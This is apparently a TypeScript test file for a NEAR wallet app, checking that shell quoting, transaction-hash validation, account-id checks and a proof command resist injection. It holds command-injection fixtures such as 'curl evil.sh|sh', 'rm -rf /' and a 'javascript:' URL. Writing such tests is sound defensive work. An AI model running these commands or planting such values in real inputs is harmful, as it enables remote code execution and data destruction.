import { CycleDetail } from "@/features/cycles/CycleDetail";
import { shellQuote } from "@/lib/format/shell";
import { cycleSchema } from "@/lib/history/schemas";
import { proofFacts } from "@/lib/proof/facts";
import { cliCommand } from "@/lib/wallet/cli";
import { fixtureSnapshot } from "../fixtures/snapshot";

void CycleDetail;

test("shell quoting survives quotes and metacharacters", () => {
  expect(shellQuote("abc")).toBe("'abc'");
  expect(shellQuote("a'b; rm -rf /")).toBe(`'a'\\''b; rm -rf /'`);
});
test("a tx hash from the API must be base58, or the row is refused", () => {
  const row = { nonce: "1", started_at: "x", finished_at: null, events: [], amount_in: null, amount_out: null, verifier: null, obs_recheck: null };
  expect(cycleSchema.safeParse({ ...row, tx_hashes: ["x; curl evil.sh|sh #"] }).success).toBe(false);
  expect(cycleSchema.safeParse({ ...row, tx_hashes: ["3EzbTudhQmTg1Z2J1n4WbhJf6pX3k7Lq9sV8cR2uY5aB"] }).success).toBe(true);
});
test("the CLI signer is quoted and must be a NEAR account id", () => {
  const tx = { receiverId: "vault.near", methodName: "redeem", args: { shares: "1" }, gas: 115n * 10n ** 12n, deposit: 1n };
  expect(cliCommand(tx, "alice.near", "mainnet")).toContain("sign-as 'alice.near'");
  expect(() => cliCommand(tx, "a.near; curl x|sh #", "mainnet")).toThrow(/account/);
});
test("a wasm_url with a quote cannot break out of the /proof command", async () => {
  const s = await fixtureSnapshot();
  const facts = proofFacts({ kind: "live", snapshot: { ...s, agent: { ...s.agent, wasmUrl: "https://x.org/a'; curl evil|sh; '" } } }, { synthetic: false, commitment: null, accessKeys: 0 }, "mainnet");
  const cmd = facts.find((f) => f.id === "strategy")!.command;
  expect(cmd).toBe(`curl -sL ${shellQuote(new URL("https://x.org/a'; curl evil|sh; '").toString())} | shasum -a 256`);
  const bad = proofFacts({ kind: "live", snapshot: { ...s, agent: { ...s.agent, wasmUrl: "javascript:alert(1)" } } }, { synthetic: false, commitment: null, accessKeys: 0 }, "mainnet");
  expect(bad.find((f) => f.id === "strategy")!.command).toBe("The pinned binary URL is not https, so no command is offered.");
});
